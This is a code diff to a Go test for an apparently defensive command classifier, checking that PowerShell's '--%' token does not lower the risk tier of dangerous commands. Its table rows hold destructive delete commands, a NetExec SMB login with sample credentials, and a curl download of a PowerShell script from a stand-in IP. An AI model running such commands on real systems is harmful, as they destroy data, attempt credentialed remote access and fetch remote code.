@@ -19,7 +19,8 @@ import (
 // see stays unread and keeps the unknown tier: a %VAR% expansion, or a cmd,
 // powershell or pwsh program (the remainder is a script). A destructive call
 // behind --% is never weaker than its plain spelling nor than the unknown
-// tier it had (every word of those names a place outside the project).
+// tier it had (every word of those names a place outside the project, or a
+// remote host).
 // Red at det111/engine-train-6 f9b5854812 and a64bfdb931 (every
 // --% remainder was unread: the benign rows alerted, blocked in strict).
 func TestStopParsingTokenReadsTheNativeArgv(t *testing.T) {
@@ -58,6 +59,9 @@ func TestStopParsingTokenReadsTheNativeArgv(t *testing.T) {
 		{"cmd-rmdir", "cmd.exe /c --% rmdir /s /q " + state, "cmd.exe /c rmdir /s /q " + state},
 		{"git-clean", "git --% -C " + state + " clean -fdx", "git -C " + state + " clean -fdx"},
 		{"del-percent", `cmd.exe /c --% del /q %USERPROFILE%\.defenseclaw\config.yaml`, ""},
+		// a remote place: the floor stays (GAP-0201 NetExec row)
+		{"nxc-remote", "nxc --% smb 192.0.2.5 -u admin -p pass123", ""},
+		{"curl-url", "curl.exe --% http://198.51.100.7/x.ps1 -o x.ps1", ""},
 	}
 	rank := map[string]int{"allow": 0, "alert": 1, "block": 2}
 	shapeParityTiers(t, func(t *testing.T, p gap0437Pack) {
